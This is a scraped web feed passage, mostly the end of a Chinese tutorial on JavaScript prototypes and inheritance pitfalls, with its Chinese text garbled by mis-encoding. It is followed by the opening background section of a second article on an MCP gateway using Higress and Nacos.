<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> <span class="hljs-title class_">Dog</span>); <span class="hljs-comment">// "function"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true</span>
</code></pre>
<h4 data-id="heading-17">class çš„ä¸€äº›ç‰¹æ€§</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> {
  <span class="hljs-comment">// å®ä¾‹å±æ€§ï¼ˆES2022+ï¼‰</span>
  instanceProp = <span class="hljs-string">'instance'</span>;

  <span class="hljs-comment">// ç§æœ‰å±æ€§ï¼ˆES2022+ï¼‰</span>
  #privateProp = <span class="hljs-string">'private'</span>;

  <span class="hljs-comment">// é™æ€å±æ€§</span>
  <span class="hljs-keyword">static</span> staticProp = <span class="hljs-string">'static'</span>;

  <span class="hljs-comment">// é™æ€æ–¹æ³•</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">staticMethod</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">'static method'</span>;
  }

  <span class="hljs-comment">// getter/setter</span>
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">value</span>() {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.#privateProp;
  }
}
</code></pre>
<hr/>
<h3 data-id="heading-18">å‡ ä¸ªå®¹æ˜“è¸©çš„å‘</h3>
<h4 data-id="heading-19">1. å¼•ç”¨ç±»å‹æ”¾åŸå‹ä¸Šä¼šå…±äº«</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Student</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">Student</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">hobbies</span> = [];  <span class="hljs-comment">// æ‰€æœ‰å®ä¾‹å…±äº«è¿™ä¸ªæ•°ç»„</span>

<span class="hljs-keyword">const</span> s1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">'å¼ ä¸‰'</span>);
<span class="hljs-keyword">const</span> s2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">'æå››'</span>);

s1.<span class="hljs-property">hobbies</span>.<span class="hljs-title function_">push</span>(<span class="hljs-string">'reading'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(s2.<span class="hljs-property">hobbies</span>); <span class="hljs-comment">// ['reading']  // s2 ä¹Ÿæœ‰äº†ï¼Œå‡ºé—®é¢˜äº†</span>
</code></pre>
<p>å¼•ç”¨ç±»å‹ï¼ˆæ•°ç»„ã€å¯¹è±¡ï¼‰åº”è¯¥æ”¾åœ¨æ„é€ å‡½æ•°é‡Œï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Student</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">hobbies</span> = [];  <span class="hljs-comment">// æ¯ä¸ªå®ä¾‹ç‹¬ç«‹</span>
}
</code></pre>
<h4 data-id="heading-20">2. åˆ«ç›´æ¥æ›¿æ¢ prototype å¯¹è±¡</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"/>) {}

<span class="hljs-comment">// ç›´æ¥æ›¿æ¢ prototype ä¼šä¸¢å¤± constructor</span>
<span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = {
  <span class="hljs-attr">method</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {}
};

<span class="hljs-keyword">const</span> foo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Foo</span>); <span class="hljs-comment">// falseï¼Œå˜æˆ Object äº†</span>
</code></pre>
<p>è¦ä¹ˆè®°å¾—è¡¥ä¸Š constructorï¼Œè¦ä¹ˆç”¨å±æ€§æ·»åŠ çš„æ–¹å¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ–¹å¼ä¸€ï¼šè¡¥ä¸Š constructor</span>
<span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = {
  <span class="hljs-attr">constructor</span>: <span class="hljs-title class_">Foo</span>,
  <span class="hljs-attr">method</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {}
};

<span class="hljs-comment">// æ–¹å¼äºŒï¼šç›´æ¥æ·»åŠ å±æ€§ï¼ˆæ¨èï¼‰</span>
<span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">method</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {};
</code></pre>
<h4 data-id="heading-21">3. ç®­å¤´å‡½æ•°ä¸èƒ½ç”¨ä½œæ„é€ å‡½æ•°</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">Foo</span> = (<span class="hljs-params"/>) =&gt; {};
<span class="hljs-keyword">const</span> foo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>(); <span class="hljs-comment">// TypeError: Foo is not a constructor</span>
</code></pre>
<p>ç®­å¤´å‡½æ•°æ²¡æœ‰ <code>prototype</code> å±æ€§ï¼Œä¹Ÿæ²¡æœ‰è‡ªå·±çš„ <code>this</code>ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨ <code>new</code>ã€‚</p>
<h4 data-id="heading-22">4. instanceof çš„å±€é™æ€§</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// instanceof æ£€æŸ¥çš„æ˜¯åŸå‹é“¾</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([] <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>);  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([] <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span>); <span class="hljs-comment">// true</span>

<span class="hljs-comment">// è·¨ iframe/realm æ—¶ä¼šå¤±æ•ˆ</span>
<span class="hljs-comment">// iframe é‡Œçš„ Array å’Œä¸»é¡µé¢çš„ Array ä¸æ˜¯åŒä¸€ä¸ª</span>
</code></pre>
<p>æ›´å¯é çš„ç±»å‹æ£€æŸ¥ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>([]);  <span class="hljs-comment">// "[object Array]"</span>
<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>([]);  <span class="hljs-comment">// true</span>
</code></pre>
<hr/>
<h3 data-id="heading-23">æ€§èƒ½è€ƒè™‘</h3>
<h4 data-id="heading-24">åŸå‹é“¾æŸ¥æ‰¾æœ‰å¼€é”€</h4>
<p>å±æ€§æŸ¥æ‰¾ä¼šæ²¿ç€åŸå‹é“¾å‘ä¸Šï¼Œé“¾è¶Šé•¿å¼€é”€è¶Šå¤§ã€‚è™½ç„¶ç°ä»£å¼•æ“æœ‰ä¼˜åŒ–ï¼Œä½†è¿˜æ˜¯è¦æ³¨æ„ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¦‚æœé¢‘ç¹è®¿é—®åŸå‹é“¾ä¸Šçš„å±æ€§ï¼Œå¯ä»¥ç¼“å­˜</span>
<span class="hljs-keyword">const</span> method = obj.<span class="hljs-property">someMethod</span>;
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) {
  method.<span class="hljs-title function_">call</span>(obj);  <span class="hljs-comment">// æ¯” obj.someMethod() å¿«</span>
}
</code></pre>
<h4 data-id="heading-25">Object.create(null) åˆ›å»ºçº¯å‡€å¯¹è±¡</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ™®é€šå¯¹è±¡ä¼šç»§æ‰¿ Object.prototype</span>
<span class="hljs-keyword">const</span> obj = {};
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">toString</span>); <span class="hljs-comment">// Æ’ toString() { [native code] }</span>

<span class="hljs-comment">// çº¯å‡€å¯¹è±¡æ²¡æœ‰åŸå‹é“¾</span>
<span class="hljs-keyword">const</span> pureObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(pureObj.<span class="hljs-property">toString</span>); <span class="hljs-comment">// undefined</span>

<span class="hljs-comment">// é€‚åˆç”¨ä½œå­—å…¸/å“ˆå¸Œè¡¨ï¼Œä¸ç”¨æ‹…å¿ƒé”®åå†²çª</span>
<span class="hljs-keyword">const</span> dict = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>);
dict[<span class="hljs-string">'hasOwnProperty'</span>] = <span class="hljs-string">'safe'</span>;  <span class="hljs-comment">// ä¸ä¼šè¦†ç›–åŸå‹æ–¹æ³•</span>
</code></pre>
<hr/>
<h3 data-id="heading-26">å°ç»“</h3>
<p>åŸå‹é“¾è¯´ç©¿äº†å°±æ˜¯ä¸€æ¡æŸ¥æ‰¾é“¾ï¼šæ‰¾å±æ€§æ—¶ä»å¯¹è±¡è‡ªèº«å¼€å§‹ï¼Œé¡ºç€ <code>__proto__</code> ä¸€è·¯å¾€ä¸Šæ‰¾ï¼Œç›´åˆ° <code>null</code>ã€‚</p>
<p>å‡ ä¸ªè¦ç‚¹ï¼š</p>
<ul>
<li><code>prototype</code> æ˜¯å‡½æ•°çš„å±æ€§ï¼Œç”¨äºå­˜æ”¾å…±äº«çš„æ–¹æ³•</li>
<li><code>__proto__</code>ï¼ˆæˆ– <code>[[Prototype]]</code>ï¼‰æ˜¯å¯¹è±¡çš„å±æ€§ï¼ŒæŒ‡å‘å®ƒçš„åŸå‹</li>
<li>æ¨èç”¨ <code>Object.getPrototypeOf()</code> ä»£æ›¿ <code>__proto__</code></li>
<li><code>new</code> å…³é”®å­—åšäº†å››ä»¶äº‹ï¼šåˆ›å»ºå¯¹è±¡ã€è®¾ç½®åŸå‹ã€æ‰§è¡Œæ„é€ å‡½æ•°ã€è¿”å›å¯¹è±¡</li>
<li>æ–¹æ³•å®šä¹‰åœ¨åŸå‹ä¸Šï¼Œçœå†…å­˜</li>
<li><code>class</code> æ˜¯è¯­æ³•ç³–ï¼Œåº•å±‚è¿˜æ˜¯åŸå‹é“¾</li>
<li><code>Object.prototype</code> æ˜¯åŸå‹é“¾çš„ç»ˆç‚¹ï¼Œå®ƒçš„ <code>__proto__</code> æ˜¯ <code>null</code></li>
</ul>
<p>ç†è§£äº†è¿™ä¸ªæœºåˆ¶ï¼Œå†çœ‹ JavaScript çš„é¢å‘å¯¹è±¡å°±æ¸…æ™°å¤šäº†ã€‚æ¡†æ¶æºç é‡Œå¤§é‡ä½¿ç”¨åŸå‹é“¾ï¼Œæ¯”å¦‚ Vue 2 çš„å“åº”å¼ç³»ç»Ÿã€å„ç§æ’ä»¶çš„ mixin å®ç°ï¼Œéƒ½æ˜¯åŸºäºè¿™å¥—æœºåˆ¶ã€‚</p>
<hr/>
<p>å¦‚æœä½ è§‰å¾—è¿™ç¯‡æ–‡ç« æœ‰å¸®åŠ©ï¼Œæ¬¢è¿å…³æ³¨æˆ‘çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i" target="_blank" title="https://github.com/tt-a1i" ref="nofollow noopener noreferrer">GitHub</a>ï¼Œä¸‹é¢æ˜¯æˆ‘çš„ä¸€äº›å¼€æºé¡¹ç›®ï¼š</p>
<p><strong>Claude Code Skills</strong>ï¼ˆæŒ‰éœ€åŠ è½½ï¼Œæ„å›¾è‡ªåŠ¨è¯†åˆ«ï¼Œä¸æµªè´¹ tokenï¼Œ<a href="https://juejin.cn/post/7578714735307735066" target="_blank" title="https://juejin.cn/post/7578714735307735066">ä»‹ç»æ–‡ç« </a>ï¼‰ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fcode-review-skill" target="_blank" title="https://github.com/tt-a1i/code-review-skill" ref="nofollow noopener noreferrer">code-review-skill</a> - ä»£ç å®¡æŸ¥æŠ€èƒ½ï¼Œè¦†ç›– React 19ã€Vue 3ã€TypeScriptã€Rust ç­‰çº¦ 9000 è¡Œè§„åˆ™ï¼ˆ<a href="https://juejin.cn/post/7578709098255908902" target="_blank" title="https://juejin.cn/post/7578709098255908902">è¯¦ç»†ä»‹ç»</a>ï¼‰</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2F5-whys-skill" target="_blank" title="https://github.com/tt-a1i/5-whys-skill" ref="nofollow noopener noreferrer">5-whys-skill</a> - 5 Whys æ ¹å› åˆ†æï¼Œè¯´"æ‰¾æ ¹å› "è‡ªåŠ¨æ¿€æ´»</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Ffirst-principles-skill" target="_blank" title="https://github.com/tt-a1i/first-principles-skill" ref="nofollow noopener noreferrer">first-principles-skill</a> - ç¬¬ä¸€æ€§åŸç†æ€è€ƒï¼Œé€‚åˆæ¶æ„è®¾è®¡å’ŒæŠ€æœ¯é€‰å‹</li>
</ul>
<p><strong>å…¨æ ˆé¡¹ç›®</strong>ï¼ˆé€‚åˆå­¦ä¹ ç°ä»£æŠ€æœ¯æ ˆï¼‰ï¼š</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fprompt-vault" target="_blank" title="https://github.com/tt-a1i/prompt-vault" ref="nofollow noopener noreferrer">prompt-vault</a> - Prompt ç®¡ç†å™¨ï¼Œç”¨çš„éƒ½æ˜¯æœ€æ–°çš„æŠ€æœ¯æ ˆï¼Œé€‚åˆç”¨æ¥å­¦ä¹ äº†è§£æœ€æ–°çš„å‰ç«¯å…¨æ ˆå¼€å‘èŒƒå¼ï¼šNext.js 15 + React 19 + tRPC 11 + Supabase å…¨æ ˆç¤ºä¾‹ï¼Œclone ä¸‹æ¥é…ä¸ªå…è´¹ Supabase å°±èƒ½è·‘</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftt-a1i%2Fchat_edit" target="_blank" title="https://github.com/tt-a1i/chat_edit" ref="nofollow noopener noreferrer">chat_edit</a> - åŒæ¨¡å¼ AI åº”ç”¨ï¼ˆèŠå¤©+å¯Œæ–‡æœ¬ç¼–è¾‘ï¼‰ï¼ŒVue 3.5 + TypeScript + Vite 5 + Quill 2.0 + IndexedDB</li>
</ul>
<hr/>
<h3 data-id="heading-27">å‚è€ƒèµ„æ–™</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FGuide%2FInheritance_and_the_prototype_chain" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain" ref="nofollow noopener noreferrer">MDN - Inheritance and the prototype chain</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FLearn_web_development%2FExtensions%2FAdvanced_JavaScript_objects%2FObject_prototypes" target="_blank" title="https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Advanced_JavaScript_objects/Object_prototypes" ref="nofollow noopener noreferrer">MDN - Object prototypes</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FJavaScript%2FReference%2FOperators%2Fnew" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/new" ref="nofollow noopener noreferrer">MDN - new operator</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fjavascript.info%2Fprototype-inheritance" target="_blank" title="https://javascript.info/prototype-inheritance" ref="nofollow noopener noreferrer">JavaScript.info - Prototypal inheritance</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MCP ç½‘å…³å®æˆ˜ï¼šåŸºäº Higress + Nacos çš„é›¶ä»£ç å·¥å…·æ‰©å±•æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7581210455827021860</link>    <guid>https://juejin.cn/post/7581210455827021860</guid>    <pubDate>2025-12-08T09:15:17.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581210455827021860" data-draft-id="7581117416810954795" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MCP ç½‘å…³å®æˆ˜ï¼šåŸºäº Higress + Nacos çš„é›¶ä»£ç å·¥å…·æ‰©å±•æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="äº‘åŸç”Ÿ,MCP"/> <meta itemprop="datePublished" content="2025-12-08T09:15:17.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿é‡Œäº‘äº‘åŸç”Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/3808363977648493"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MCP ç½‘å…³å®æˆ˜ï¼šåŸºäº Higress + Nacos çš„é›¶ä»£ç å·¥å…·æ‰©å±•æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808363977648493/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿é‡Œäº‘äº‘åŸç”Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T09:15:17.000Z" title="Mon Dec 08 2025 09:15:17 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    30
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»16åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šé™†èƒ¤ä»»</p>
<h2 data-id="heading-0">èƒŒæ™¯</h2>
<p>åœ¨ AI å¤§çˆ†å‘çš„æ—¶ä»£ï¼Œå·²ç»æœ‰éå¸¸å¤šçš„ AI åŠ©æ‰‹ï¼Œç»“åˆ RAG é€šè¿‡æ™ºèƒ½é—®ç­”å¸®åŠ©ç”¨æˆ·è§£ç­”é—®é¢˜ã€‚å•çº¯åœ°ä¾é æ™ºèƒ½é—®ç­”å¸®åŠ©å®¢æˆ·è‡ªåŠ©è§£ç­”æ˜¯è¿œè¿œä¸å¤Ÿçš„ï¼Œæˆ‘ä»¬éœ€è¦è®© AI åŠ©æ‰‹èƒ½å¤Ÿç›´æ¥è°ƒç”¨å·²æœ‰çš„ä¸°å¯Œæ¥å£ï¼Œæœç€æ›´å¼ºå¤§çš„æ™ºèƒ½ä½“æ¼”è¿›ã€‚æˆ‘ä»¬é€‰ç”¨å½“ä¸‹æœ€ä¸ºç«çƒ­ï¼Œä¸”å·²é€æ­¥æˆä¸ºæ ‡å‡†çš„ MCP ä½œä¸ºæ¨¡å‹å’Œæ¥å£ä¹‹é—´é€šä¿¡çš„ä¼ è¾“åè®®ã€‚å…³äº MCPï¼Œå·²æœ‰éå¸¸å¤šçš„ä»‹ç»æ–‡ç« ï¼Œæœ¬æ–‡ä¸å†èµ˜è¿°ã€‚</p>
<p>åœ¨ä¼ä¸šå¯¹å¤–æœåŠ¡çš„åœºæ™¯ä¸‹ï¼ŒMCP Server éœ€è¦è§£å†³ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ï¼š</p>
<ol>
<li>åœ¨æœåŠ¡çš„å¤šå®ä¾‹é«˜å¯ç”¨åœºæ™¯ä¸‹ï¼Œä½¿ç”¨ SSE é€šä¿¡æ–¹å¼å¦‚ä½•ç»´æŠ¤ sessionï¼›</li>
<li>å¦‚ä½•åšåˆ°åŠ¨æ€æ›´æ–° MCP å·¥å…· Promptï¼Œåšåˆ°å¿«é€Ÿæ›´æ–°&amp;è°ƒè¯•&amp;éªŒè¯ï¼›</li>
<li>ç§Ÿæˆ·éš”ç¦»çš„äº‘æœåŠ¡åœºæ™¯ä¸‹å¦‚ä½•å¯¹ç”¨æˆ·çš„å·¥å…·è°ƒç”¨è¿›è¡Œé‰´æƒã€‚</li>
</ol>
<p>Higress å¯ä»¥å¾ˆå¥½åœ°è§£å†³ä¸Šé¢çš„é—®é¢˜ 1ï¼ŒåŒæ—¶è¿˜æœ‰å®Œå–„çš„è¿ç»´ç›‘æ§ä½“ç³»ï¼Œå¯è§†åŒ–æ˜“æ“ä½œçš„æ§åˆ¶å°ç•Œé¢ã€‚ä¸ºäº†è§£å†³é—®é¢˜ 2ï¼Œæˆ‘ä»¬å¼•å…¥äº† Nacos è´Ÿè´£æ³¨å†Œåç«¯æœåŠ¡ä»¥åŠç®¡ç†ç»´æŠ¤ MCP å·¥å…·çš„å…ƒæ•°æ®ç­‰ä¿¡æ¯ã€‚åœ¨æ•´ä¸ª MCP æœåŠ¡ä¸­ï¼ŒHigress æ‹…ä»» MCP Proxy çš„è§’è‰²ï¼ŒNacos æ‹…ä»» MCP Registry çš„è§’è‰²ã€‚å¯¹äºé—®é¢˜ 3 ç§Ÿæˆ·éš”ç¦»é—®é¢˜ï¼Œä¼šåœ¨ä¸‹é¢é‰´æƒç« èŠ‚ä¸­è¿›è¡Œè¯¦ç»†è¯´æ˜ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0eba8180a02843ce87ac6f061198089e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765870494&amp;x-signature=So7bS373hR83Pm%2F3%2BxQzPYdzbww%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
